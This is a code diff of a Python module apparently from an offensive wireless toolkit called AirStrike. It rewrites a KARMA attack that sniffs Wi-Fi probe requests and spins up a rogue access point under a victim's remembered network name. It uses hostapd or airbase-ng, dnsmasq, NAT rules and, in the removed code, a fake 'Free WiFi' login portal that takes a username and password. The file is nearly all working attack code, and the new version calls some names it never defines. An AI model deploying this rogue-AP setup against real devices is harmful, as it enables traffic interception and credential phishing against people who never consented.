@@ -1,502 +1,204 @@
-"""
-Karma Attack Module - Creates rogue access points based on probe requests
-"""
-
+# AirStrike/core_attacks/karma_attack.py
 import os
 import sys
 import time
-import threading
-import random
 import subprocess
-import requests
-import signal
-from werkzeug.serving import make_server
-from flask import Flask, request, jsonify
-from scapy.all import sniff, Dot11ProbeReq, Dot11, RadioTap, Dot11Beacon, Dot11Elt, Dot11Auth, Dot11AssoReq, sendp, RandMAC
-from scapy.layers.dot11 import RSNCipherSuite, Dot11EltRSN, Dot11ProbeResp
-from collections import Counter
+import tempfile
+import shutil # For shutil.rmtree
 
-sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))
-from web.shared import add_log_message_shared as add_log_message
-from utils.network_utils import set_monitor_mode, set_managed_mode, sniff_probe_requests
+# --- Path Setup & Utility Imports ---
+project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
+if project_root not in sys.path:
+    sys.path.insert(0, project_root)
 
-# Network configuration
-DHCP_CONF = "/etc/dnsmasq.conf"
-FAKE_GATEWAY_IP = "192.168.50.1"
-SUBNET = "192.168.50.0/24"
-CAPTIVE_PORTAL_PORT = 9001
-FAKE_MAC = "90:91:64:56:25:F5"
-WEB_API_PORT = 5000  # Default Flask port
+try:
+    from utils.network_utils import set_monitor_mode, set_managed_mode, run_with_sudo, sniff_probe_requests
+    # For KARMA, we might reuse parts of Evil Twin setup for the AP
+    from .evil_twin import create_hostapd_config_content, create_dnsmasq_config_content, \
+                           setup_evil_twin_network_interface, enable_ip_forwarding_and_nat
+except ImportError as e:
+    print(f"ERROR (karma_attack.py): Failed to import utils or evil_twin components: {e}")
+    # Define placeholders
+    def set_monitor_mode(iface): print(f"Placeholder: set_monitor_mode({iface})"); return False
+    def set_managed_mode(iface): print(f"Placeholder: set_managed_mode({iface})"); return True
+    def run_with_sudo(cmd, timeout=30): return False, "", "Placeholder: run_with_sudo error"
+    def sniff_probe_requests(iface, dur): return []
+    def create_hostapd_config_content(*args): return "Placeholder hostapd config"
+    def create_dnsmasq_config_content(*args): return "Placeholder dnsmasq config"
+    def setup_evil_twin_network_interface(*args, **kwargs): return False
+    def enable_ip_forwarding_and_nat(*args, **kwargs): return False
 
-class FakeAP:
-    def __init__(self, ssid, interface, channel=1):
-        self.ssid = ssid
-        self.interface = interface
-        self.channel = channel
-        self.mac = FAKE_MAC
-        self.clients = set()
-        self.airbase_process = None
-        self.dnsmasq_process = None
-        self.flask_process = None
-        self.portal_thread = None
-        self._stop_flask = threading.Event()
 
-    def _check_interface_exists(self, interface, max_retries=10, delay=1):
-        """Check if network interface exists"""
-        for _ in range(max_retries):
-            try:
-                result = subprocess.run(
-                    ["ip", "link", "show", interface],
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    check=False
-                )
-                if result.returncode == 0:
-                    return True
-            except:
-                pass
-            time.sleep(delay)
-        return False
-        
-    def start_ap(self):
-        """Start airbase-ng to create the fake AP"""
-        try:
-            # Kill any existing airbase-ng processes
-            subprocess.run(["sudo", "killall", "airbase-ng"], stderr=subprocess.DEVNULL)
-            
-            # Remove existing at0 interface if it exists
-            subprocess.run(["sudo", "ip", "link", "set", "at0", "down"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "ip", "link", "delete", "at0"], stderr=subprocess.DEVNULL)
-            
-            add_log_message(f"[*] Launching fake AP for SSID: {self.ssid}")
-            self.airbase_process = subprocess.Popen([
-                "airbase-ng",
-                "-e", self.ssid,
-                "-c", str(self.channel),
-                "-a", self.mac,
-                "-v",  # Verbose output
-                self.interface
-            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            
-            # Wait for at0 interface to be created
-            if not self._check_interface_exists("at0"):
-                add_log_message("[-] Failed to create at0 interface")
-                return False
-                
-            add_log_message("[+] Successfully created at0 interface")
-            return True
-            
-        except Exception as e:
-            add_log_message(f"[-] Error starting airbase-ng: {e}")
-            return False
-
-    def _configure_interface(self):
-        """Configure the at0 interface with IP and routing"""
-        try:
-            # Bring down interface first
-            subprocess.run(["sudo", "ip", "link", "set", "at0", "down"], check=True)
-            time.sleep(1)
-
-            # Flush any existing IP configuration
-            subprocess.run(["sudo", "ip", "addr", "flush", "dev", "at0"], check=True)
-            
-            # Bring up interface
-            subprocess.run(["sudo", "ip", "link", "set", "at0", "up"], check=True)
-            time.sleep(1)
-
-            # Add IP address with broadcast
-            subprocess.run([
-                "sudo", "ip", "addr", "add",
-                f"{FAKE_GATEWAY_IP}/24",
-                "broadcast", "192.168.50.255",
-                "dev", "at0"
-            ], check=True)
-            time.sleep(1)
-
-            # Check current routing table
-            add_log_message("[*] Current routing table:")
-            subprocess.run(["ip", "route", "show"], check=True)
-
-            # Try to delete any existing route for our subnet first
-            try:
-                subprocess.run(["sudo", "ip", "route", "del", SUBNET], stderr=subprocess.DEVNULL)
-            except:
-                pass
-
-            # Add route without checking return code
-            try:
-                subprocess.run(["sudo", "ip", "route", "add", SUBNET, "dev", "at0"])
-            except:
-                # If adding route fails, try alternative approach
-                try:
-                    # Try adding route with specific gateway
-                    subprocess.run([
-                        "sudo", "ip", "route", "add",
-                        SUBNET,
-                        "via", FAKE_GATEWAY_IP,
-                        "dev", "at0"
-                    ])
-                except:
-                    add_log_message("[-] Warning: Could not add route, continuing anyway...")
-
-            # Verify final configuration
-            add_log_message("[*] Final interface configuration:")
-            subprocess.run(["ip", "addr", "show", "dev", "at0"])
-            add_log_message("[*] Final routing table:")
-            subprocess.run(["ip", "route", "show"])
-            
-            return True
-        except subprocess.CalledProcessError as e:
-            add_log_message(f"[-] Error configuring interface: {str(e)}")
-            return False
-
-    def setup_network(self):
-        """Configure network interface and services"""
-        try:
-            # Kill any existing DHCP servers
-            self._kill_existing_dhcp()
-            
-            # Start airbase-ng to create at0 interface
-            if not self.start_ap():
-                return False
-            
-            # Configure network interface
-            add_log_message("[*] Setting up network interface...")
-            if not self._configure_interface():
-                return False
-
-            # Configure IP forwarding
-            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
-            
-            # Configure firewall rules
-            subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], check=True)
-            subprocess.run(["sudo", "iptables", "-F"], check=True)
-            subprocess.run(["sudo", "iptables", "-X"], check=True)
-            
-            # Add NAT rules
-            subprocess.run([
-                "sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
-                "-o", "eth0", "-j", "MASQUERADE"
-            ], check=True)
-            
-            # Add forwarding rules
-            subprocess.run([
-                "sudo", "iptables", "-A", "FORWARD",
-                "-i", "at0", "-o", "eth0", "-j", "ACCEPT"
-            ], check=True)
-            
-            # Add captive portal redirect
-            subprocess.run([
-                "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
-                "-i", "at0", "-p", "tcp", "--dport", "80",
-                "-j", "REDIRECT", "--to-port", str(CAPTIVE_PORTAL_PORT)
-            ], check=True)
-
-            # Write and start DHCP server
-            self._write_dnsmasq_config()
-            self._start_dnsmasq()
-            
-            # Start captive portal
-            self._start_captive_portal()
-            
-            add_log_message("[+] Network setup complete")
-            return True
-            
-        except subprocess.CalledProcessError as e:
-            add_log_message(f"[-] Error setting up network: {e}")
-            return False
-        except Exception as e:
-            add_log_message(f"[-] Unexpected error: {e}")
-            return False
-
-    def _kill_existing_dhcp(self):
-        """Kill any existing DHCP servers"""
-        try:
-            subprocess.run(["sudo", "systemctl", "stop", "isc-dhcp-server"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "systemctl", "stop", "dhcpd"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "killall", "dhcpd"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "killall", "dnsmasq"], stderr=subprocess.DEVNULL)
-        except:
-            pass
-
-    def _write_dnsmasq_config(self):
-        """Write dnsmasq configuration file"""
-        config = f"""
-interface=at0
-dhcp-range=192.168.50.10,192.168.50.100,12h
-dhcp-option=3,{FAKE_GATEWAY_IP}
-dhcp-option=6,{FAKE_GATEWAY_IP}
-server=8.8.8.8
-log-queries
-log-dhcp
-"""
-        with open(DHCP_CONF, "w") as f:
-            f.write(config)
-
-    def _start_dnsmasq(self):
-        """Start dnsmasq DHCP server"""
-        try:
-            self.dnsmasq_process = subprocess.Popen(
-                ["dnsmasq", "--conf-file=" + DHCP_CONF],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
-            )
-            add_log_message("[+] Started DNSMASQ server")
-        except Exception as e:
-            add_log_message(f"[-] Failed to start DNSMASQ: {e}")
-
-    def _start_captive_portal(self):
-        """Start the captive portal"""
-        app = Flask(__name__)
-
-        @app.route('/')
-        def index():
-            return """
-            <h1>Welcome to Free WiFi</h1>
-            <p>Please login to access the internet.</p>
-            <form>
-                <input type="text" placeholder="Username">
-                <input type="password" placeholder="Password">
-                <button type="submit">Login</button>
-            </form>
-            """
-
-        # Start Flask in a separate thread with proper server handling
-        def run_flask():
-            try:
-                # Create a proper server instance
-                self.flask_process = make_server('0.0.0.0', CAPTIVE_PORTAL_PORT, app)
-                self.flask_process.serve_forever()
-            except OSError as e:
-                if e.errno == 98:  # Address already in use
-                    add_log_message("[-] Captive portal port already in use. Trying to kill existing process...")
-                    try:
-                        subprocess.run(["sudo", "fuser", "-k", f"{CAPTIVE_PORTAL_PORT}/tcp"], check=False)
-                        time.sleep(2)  # Wait for the port to be freed
-                        # Try running again
-                        self.flask_process = make_server('0.0.0.0', CAPTIVE_PORTAL_PORT, app)
-                        self.flask_process.serve_forever()
-                    except Exception as e2:
-                        add_log_message(f"[-] Failed to start captive portal: {e2}")
-                else:
-                    add_log_message(f"[-] Failed to start captive portal: {e}")
-
-        self.portal_thread = threading.Thread(target=run_flask)
-        self.portal_thread.daemon = True
-        self.portal_thread.start()
-        add_log_message("[+] Started captive portal")
-
-    def cleanup(self):
-        """Cleanup all resources"""
-        add_log_message("[*] Cleaning up resources...")
-        
-        # Stop the captive portal
-        try:
-            if self.flask_process:
-                self.flask_process.shutdown()
-                if self.portal_thread and self.portal_thread.is_alive():
-                    self.portal_thread.join(timeout=5)
-            # Kill any remaining process on the port
-            subprocess.run(["sudo", "fuser", "-k", f"{CAPTIVE_PORTAL_PORT}/tcp"], check=False)
-        except:
-            pass
-
-        # Stop airbase-ng
-        try:
-            if self.airbase_process:
-                self.airbase_process.terminate()
-                self.airbase_process.wait(timeout=5)
-        except:
-            pass
-
-        # Stop dnsmasq
-        try:
-            if self.dnsmasq_process:
-                self.dnsmasq_process.terminate()
-                self.dnsmasq_process.wait(timeout=5)
-        except:
-            pass
-
-        # Kill any remaining processes
-        try:
-            subprocess.run(["sudo", "killall", "airbase-ng"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "killall", "dnsmasq"], stderr=subprocess.DEVNULL)
-        except:
-            pass
-
-        # Clean up network interfaces
-        try:
-            subprocess.run(["sudo", "ip", "link", "set", "at0", "down"], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "ip", "link", "delete", "at0"], stderr=subprocess.DEVNULL)
-        except:
-            pass
-
-        # Reset iptables rules
-        try:
-            subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], check=False)
-            subprocess.run(["sudo", "iptables", "-F"], check=False)
-            subprocess.run(["sudo", "iptables", "-X"], check=False)
-        except:
-            pass
-
-        add_log_message("[+] Cleanup completed")
-
-def get_probe_requests(interface, duration):
+def karma_attack_worker(attack_id, network_params, attack_config_params, log_callback, status_callback, stop_event, app_config):
     """
-    Get probe requests using the web API
+    Worker function for KARMA attacks.
+    It sniffs for probe requests and then sets up rogue APs for those SSIDs.
+    This is a simplified conceptual KARMA. True KARMA often involves more dynamic AP creation.
+    This version will pick one SSID from probes (or use provided one) and set up an AP.
+    """
+    ap_interface = app_config.get('DEFAULT_INTERFACE', 'wlan0')
+    wan_interface = attack_config_params.get('wan_interface', 'eth0') # For internet sharing
+
+    log_callback(attack_id, f"KARMA Attack worker started. AP Interface: {ap_interface}")
+    status_callback(attack_id, "initializing", 5)
+
+    # Config for KARMA
+    probe_sniff_duration = int(attack_config_params.get('probe_sniff_duration', 30)) # Sniff for 30s
+    # If an ESSID is provided in network_params, use that directly. Otherwise, sniff.
+    target_essid_from_params = network_params.get('essid')
     
-    Args:
-        interface (str): Network interface to use
-        duration (int): How long to scan for in seconds
-        
-    Returns:
-        list: List of discovered SSIDs
-    """
-    try:
-        # Call the web API endpoint
-        response = requests.get(
-            f'http://localhost:{WEB_API_PORT}/sniff_probe_requests',
-            params={'interface': interface, 'duration': duration}
-        )
-        
-        if response.status_code == 200:
-            return response.json()
-        else:
-            error = response.json().get('error', 'Unknown error')
-            add_log_message(f"[-] Failed to get probe requests: {error}")
-            return []
-            
-    except Exception as e:
-        add_log_message(f"[-] Error calling probe request API: {e}")
-        return []
+    ap_ip_address = attack_config_params.get('ap_ip', '10.0.1.1') # Different subnet from EvilTwin example
+    default_channel = network_params.get('channel', '6') # Use provided channel or default
 
-def karma_worker(interface, target_ssid, duration, stop_event):
-    """
-    Main worker function for Karma attack
-    
-    Args:
-        interface (str): Network interface in monitor mode
-        target_ssid (str): Target SSID to spoof
-        duration (int): Duration to run in seconds
-        stop_event (threading.Event): Event to signal when to stop
-    """
-    try:
-        add_log_message(f"[Karma] Starting attack targeting SSID: {target_ssid}")
-        add_log_message(f"[Karma] Using interface: {interface}")
+    # --- Phase 1: Sniff for Probe Requests (if no specific ESSID given) ---
+    rogue_ssid_to_spoof = target_essid_from_params
+    if not rogue_ssid_to_spoof:
+        log_callback(attack_id, f"No target ESSID provided. Sniffing for probe requests for {probe_sniff_duration}s on {ap_interface}...")
+        status_callback(attack_id, "sniffing_probes", 10)
         
-        # Create and setup AP
-        ap = FakeAP(target_ssid, interface)
+        # sniff_probe_requests from utils should handle monitor mode for sniffing
+        probed_ssids = sniff_probe_requests(ap_interface, probe_sniff_duration) # This returns a list
         
-        # Setup network configuration
-        if not ap.setup_network():
-            add_log_message("[-] Failed to setup network configuration")
+        if stop_event.is_set():
+            log_callback(attack_id, "Attack stopped during probe sniffing.")
+            status_callback(attack_id, "stopped", 15)
+            # Ensure interface is reset if sniff_probe_requests doesn't do it on early exit
+            set_managed_mode(ap_interface)
             return
-            
-        start_time = time.time()
+
+        if not probed_ssids:
+            log_callback(attack_id, "No probe requests detected. Cannot proceed with KARMA attack.")
+            status_callback(attack_id, "failed", 20)
+            set_managed_mode(ap_interface) # Reset mode
+            return
         
-        # Run the AP for the specified duration
-        while not stop_event.is_set() and (time.time() - start_time) < duration:
-            time.sleep(1)
-            
-        if not stop_event.is_set():
-            add_log_message("[Karma] Attack completed")
+        # Choose an SSID to spoof. For simplicity, pick the first one.
+        # A more advanced KARMA would react to multiple or specific probes.
+        rogue_ssid_to_spoof = probed_ssids[0]
+        log_callback(attack_id, f"Detected SSIDs: {probed_ssids}. Will attempt to spoof: '{rogue_ssid_to_spoof}'")
+    else:
+        log_callback(attack_id, f"Using provided ESSID for KARMA: '{rogue_ssid_to_spoof}'")
+
+    status_callback(attack_id, "configuring_ap", 25)
+
+    # --- Phase 2: Setup Rogue AP (similar to Evil Twin) ---
+    log_callback(attack_id, f"Configuring Rogue AP for SSID: '{rogue_ssid_to_spoof}', Channel: {default_channel}, AP_IP: {ap_ip_address}")
+
+    tmp_dir = tempfile.mkdtemp(prefix="airstrike_karma_")
+    log_callback(attack_id, f"Temporary config directory: {tmp_dir}")
+
+    hostapd_conf_path = os.path.join(tmp_dir, "hostapd_karma.conf")
+    dnsmasq_conf_path = os.path.join(tmp_dir, "dnsmasq_karma.conf")
+
+    # For KARMA, hostapd often uses 'ssid=' (empty) or specific SSIDs based on probes.
+    # This example uses one chosen SSID.
+    hostapd_content = create_hostapd_config_content(ap_interface, rogue_ssid_to_spoof, default_channel)
+    dnsmasq_content = create_dnsmasq_config_content(ap_interface, ip_address=ap_ip_address,
+                                                  dhcp_range_start="10.0.1.10", dhcp_range_end="10.0.1.50") # Adjusted range
+
+    try:
+        with open(hostapd_conf_path, "w") as f: f.write(hostapd_content)
+        with open(dnsmasq_conf_path, "w") as f: f.write(dnsmasq_content)
+        log_callback(attack_id, "hostapd and dnsmasq config files for KARMA created.")
+    except IOError as e:
+        log_callback(attack_id, f"Error writing KARMA config files: {e}")
+        status_callback(attack_id, "failed", 30)
+        if os.path.exists(tmp_dir): shutil.rmtree(tmp_dir)
+        return
+
+    # Ensure AP interface is suitable for hostapd (typically managed/AP mode)
+    if is_monitor_mode(ap_interface):
+        log_callback(attack_id, f"Interface '{ap_interface}' is in monitor mode. Setting to managed for hostapd.")
+        if not set_managed_mode(ap_interface):
+            log_callback(attack_id, f"Error: Failed to set '{ap_interface}' to managed mode.")
+            status_callback(attack_id, "failed", 33)
+            if os.path.exists(tmp_dir): shutil.rmtree(tmp_dir)
+            return
+
+    if not setup_evil_twin_network_interface(ap_interface, ap_ip_address, log_callback=log_callback, attack_id=attack_id):
+        log_callback(attack_id, "Error: Failed to configure KARMA AP network interface.")
+        status_callback(attack_id, "failed", 35)
+        if os.path.exists(tmp_dir): shutil.rmtree(tmp_dir)
+        return
+    status_callback(attack_id, "configuring_nat", 40)
+
+    if wan_interface and wan_interface != ap_interface:
+        if not enable_ip_forwarding_and_nat(wan_interface, ap_interface, log_callback=log_callback, attack_id=attack_id):
+            log_callback(attack_id, "Warning: Failed to configure IP forwarding/NAT for KARMA. Internet sharing may not work.")
         else:
-            add_log_message("[Karma] Attack stopped by user")
-            
+            log_callback(attack_id, "IP forwarding and NAT enabled for KARMA AP.")
+    else:
+        log_callback(attack_id, "Skipping NAT setup for KARMA (no distinct WAN interface).")
+    
+    status_callback(attack_id, "starting_services", 45)
+
+    hostapd_process = None
+    dnsmasq_process = None
+    sudo_prefix = [] if os.geteuid() == 0 else ['sudo']
+
+    try:
+        log_callback(attack_id, f"Starting hostapd for KARMA with config: {hostapd_conf_path}")
+        hostapd_cmd = sudo_prefix + ["hostapd", "-B", hostapd_conf_path]
+        h_success, h_out, h_err = run_with_sudo(" ".join(hostapd_cmd), timeout=10)
+        if not h_success:
+            log_callback(attack_id, f"hostapd for KARMA potentially failed. Error: {h_err}. Output: {h_out}.")
+        else:
+            log_callback(attack_id, "hostapd for KARMA started.")
+        status_callback(attack_id, "running_hostapd", 50)
+        time.sleep(3)
+
+        log_callback(attack_id, f"Starting dnsmasq for KARMA with config: {dnsmasq_conf_path}")
+        dnsmasq_cmd = sudo_prefix + ["dnsmasq", "-C", dnsmasq_conf_path, "--no-daemon"]
+        dnsmasq_process = subprocess.Popen(dnsmasq_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        log_callback(attack_id, f"dnsmasq for KARMA started (PID: {dnsmasq_process.pid}).")
+        status_callback(attack_id, "running", 60) # KARMA AP is now "running"
+
+        while not stop_event.is_set():
+            if dnsmasq_process.poll() is not None:
+                log_callback(attack_id, f"dnsmasq process for KARMA terminated (code: {dnsmasq_process.returncode}).")
+                dns_out, dns_err = dnsmasq_process.communicate()
+                log_callback(attack_id, f"dnsmasq STDOUT: {dns_out}")
+                log_callback(attack_id, f"dnsmasq STDERR: {dns_err}")
+                status_callback(attack_id, "failed", dnsmasq_process.returncode or 80)
+                break
+            time.sleep(1)
+
+        if stop_event.is_set():
+            log_callback(attack_id, "Stop event received for KARMA attack.")
+            status_callback(attack_id, "stopping", 90)
+
+    except FileNotFoundError as fnf_err:
+        log_callback(attack_id, f"Error: Required command not found for KARMA (hostapd or dnsmasq?). {fnf_err}")
+        status_callback(attack_id, "failed", 38)
     except Exception as e:
-        add_log_message(f"[Karma] Error in karma attack: {e}")
-        raise
+        log_callback(attack_id, f"An error occurred during KARMA setup/run: {e}")
+        status_callback(attack_id, "failed", 39)
     finally:
-        # Cleanup
-        try:
-            ap.cleanup()
-            set_managed_mode(interface)
-            add_log_message("[Karma] Interface reset to managed mode")
-        except Exception as e:
-            add_log_message(f"[Karma] Error during cleanup: {e}")
+        log_callback(attack_id, "Cleaning up KARMA attack...")
+        if dnsmasq_process and dnsmasq_process.poll() is None:
+            log_callback(attack_id, "Terminating dnsmasq for KARMA...")
+            dnsmasq_process.terminate()
+            try: dnsmasq_process.wait(timeout=5)
+            except subprocess.TimeoutExpired: dnsmasq_process.kill()
+        
+        log_callback(attack_id, "Stopping hostapd for KARMA (using killall)...")
+        run_with_sudo("killall hostapd")
+        time.sleep(1)
 
-def scan_channels(interface, duration=5):
-    """
-    Scan WiFi channels to find the most active one
-    
-    Args:
-        interface (str): Network interface to use
-        duration (int): How long to scan for in seconds
-    
-    Returns:
-        int: Most active channel number
-    """
-    add_log_message(f"[*] Scanning Wi-Fi channels on {interface} for {duration} seconds...")
-    channel_counts = Counter()
-    stop_sniffing = threading.Event()
+        log_callback(attack_id, "Restoring iptables for KARMA (flushing NAT and FORWARD)...")
+        run_with_sudo("iptables -F -t nat")
+        run_with_sudo("iptables -F FORWARD")
 
-    def channel_hopper():
-        while not stop_sniffing.is_set():
-            channel = random.randint(1, 11)
-            try:
-                subprocess.run(["sudo", "iwconfig", interface, "channel", str(channel)], 
-                             check=True, stderr=subprocess.DEVNULL)
-            except subprocess.CalledProcessError:
-                continue
-            time.sleep(0.5)
+        log_callback(attack_id, f"Restoring interface '{ap_interface}' to managed mode after KARMA.")
+        if not set_managed_mode(ap_interface):
+            log_callback(attack_id, f"Warning: Failed to restore '{ap_interface}' to managed mode after KARMA.")
 
-    def packet_handler(pkt):
-        if pkt.haslayer(Dot11):
-            try:
-                channel = int(ord(pkt[Dot11].notdecoded[-1:])) if hasattr(pkt[Dot11], 'notdecoded') else None
-                if channel:
-                    channel_counts[channel] += 1
-            except:
-                pass
+        if os.path.exists(tmp_dir):
+            try: shutil.rmtree(tmp_dir)
+            except Exception as e_clean: log_callback(attack_id, f"Error removing KARMA temp dir '{tmp_dir}': {e_clean}")
+        
+        final_status = "stopped" if stop_event.is_set() else (_active_attacks.get(attack_id, {}).get('status', 'unknown_end'))
+        if final_status not in ["completed", "failed", "stopped"]:
+             status_callback(attack_id, "stopped" if stop_event.is_set() else "completed_unknown", 100)
+        log_callback(attack_id, "KARMA Attack worker finished.")
 
-    # Start channel hopper thread
-    hopper_thread = threading.Thread(target=channel_hopper)
-    hopper_thread.daemon = True
-    hopper_thread.start()
-
-    # Sniff for the specified duration
-    sniff(iface=interface, timeout=duration, prn=packet_handler, store=0)
-    
-    # Stop the channel hopper
-    stop_sniffing.set()
-    hopper_thread.join()
-
-    # Select best channel
-    best_channel = channel_counts.most_common(1)
-    selected_channel = best_channel[0][0] if best_channel else 1
-    
-    add_log_message(f"[+] Selected best Wi-Fi channel: {selected_channel} (used by {channel_counts[selected_channel]} networks)")
-    return selected_channel
-
-def sniff_probe_requests(interface, duration):
-    """
-    Sniff for probe requests to find target SSIDs
-    
-    Args:
-        interface (str): Network interface to use
-        duration (int): How long to sniff for in seconds
-    
-    Returns:
-        list: List of discovered SSIDs
-    """
-    add_log_message(f"[*] Sniffing for probe requests on {interface} for {duration} seconds...")
-    ssids = set()
-    start_time = time.time()
-
-    def packet_handler(pkt):
-        if pkt.haslayer(Dot11ProbeReq):
-            try:
-                ssid = pkt.info.decode(errors="ignore")
-                if ssid and len(ssid.strip()) > 0:
-                    ssids.add(ssid)
-            except:
-                pass
-
-    # Start sniffing with the specified duration
-    sniff(iface=interface, 
-          timeout=duration,  # Use the provided duration
-          prn=packet_handler,
-          store=0)  # Don't store packets to save memory
-
-    add_log_message(f"[+] Found {len(ssids)} unique SSIDs in {duration} seconds")
-    return list(ssids)
